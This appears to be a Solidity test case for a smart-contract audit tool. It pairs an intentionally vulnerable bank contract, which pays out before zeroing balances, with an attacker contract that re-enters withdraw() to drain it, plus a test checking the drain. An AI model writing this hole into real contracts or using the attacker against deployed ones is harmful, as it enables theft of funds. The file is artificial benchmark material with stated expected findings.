// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Reentrancy PoC (Minimal)
 * @notice Minimal reentrancy PoC test — no external dependencies, self-contained exploit verification
 * @difficulty Beginner
 * @vuln_types Reentrancy
 * @expected_findings testExploit() should demonstrate bank drain via reentrancy
 * @audit_command claude "audit contracts/test-cases/Reentrancy.sol"
 */

// Minimal Test stub (no external dependencies)
abstract contract Test {
    function assertEq(uint a, uint b) internal pure { require(a == b, "assertEq failed"); }
    function assertTrue(bool b) internal pure { require(b, "assertTrue failed"); }
}

// Import vulnerable contract inline
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // BUG: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Attacker contract that exploits reentrancy
contract Attacker {
    VulnerableBank public bank;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    function attack() external payable {
        // Step 1: Deposit some ETH
        bank.deposit{value: DEPOSIT_AMOUNT}();
        // Step 2: Withdraw - triggers reentrancy
        bank.withdraw();
    }
    
    // Fallback function that re-enters withdraw()
    receive() external payable {
        if (address(bank).balance >= DEPOSIT_AMOUNT) {
            bank.withdraw();
        }
    }
    
    function getProfit() public view returns (uint256) {
        return address(this).balance - DEPOSIT_AMOUNT;
    }
}

// Foundry test contract
contract ReentrancyExploitTest is Test {
    VulnerableBank public bank;
    Attacker public attacker;
    
    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));
        
        // Fund the bank with 10 ETH
        // We need to deposit from a regular address first
        bank.deposit{value: 10 ether}();
    }
    
    function test_reentrancy_drains_bank() public {
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        // Execute attack with 1 ETH
        attacker.attack{value: 1 ether}();
        
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerProfit = attacker.getProfit();
        
        // Verify: attacker drained more than deposited
        assertTrue(attackerProfit > 0);
        // Verify: bank lost funds
        assertTrue(bankBalanceAfter < bankBalanceBefore);
        
        // Log results
        // In a real Foundry test we'd use emit log_named_uint
    }
}
